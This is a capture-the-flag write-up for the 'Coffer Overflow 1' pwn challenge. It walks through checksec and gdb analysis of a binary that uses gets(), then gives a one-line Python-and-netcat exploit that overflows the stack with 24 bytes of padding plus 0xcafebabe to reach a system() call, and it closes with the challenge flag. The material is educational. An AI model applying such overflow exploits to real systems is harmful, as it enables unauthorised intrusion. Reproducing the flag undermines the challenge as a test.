# Coffer Overflow 1

- Genre pwn

First, I checked the basic information about this binary by running some commands:
```sh
> file coffer-overflow-1
coffer-overflow-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a9dc1b9cad90601091c6249ccaf96dd5354440c, not stripped
> checksec coffer-overflow-1
[*] 'coffer-overflow-1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

It is a 64-bit elf and seems no shellcode allowed for this challenge.  
I ran this binary to see what it did.  

![image](https://user-images.githubusercontent.com/53568647/85848526-a2d11e00-b7ec-11ea-8663-e0f283cebd1c.png)

It asked for the user input then just exited.  
I ran gdb to take a closer look at this program.  

![image](https://user-images.githubusercontent.com/53568647/85848270-35bd8880-b7ec-11ea-8fed-4d072f629dac.png)

It had gets function and was vulnerable to buffer overflow. It was interesting that it actually called system function but required to pass the comparison to execute this.  
It examined the value of rax and if it was __0xcafebabe__ it would call system. At this point, I could assume that I could overwrite this value then pass the condition.  

To find out the required buffer I researched this binary a bit more in depth.  
I typed a random number of 'A' and observed the stack.  

![image](https://user-images.githubusercontent.com/53568647/85848276-381fe280-b7ec-11ea-8fc5-2ede9c79e0ec.png)

Based on the disassemble of the main function, the value of rax was inherited from rbp -8, and there were 24 bytes to fill the gap. Then __0xcafebabe__ would be injected following 24 byte long junk.  

I ran the following command and got the flag for this challenge.  
```sh
(python -c "print('A' * 24 + '\xbe\xba\xfe\xca' + '\x00'* 4)"; cat) | nc 2020.redpwnc.tf 31255
```

![image](https://user-images.githubusercontent.com/53568647/85848965-74077780-b7ed-11ea-82ba-f7e6b2d69509.png)

flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}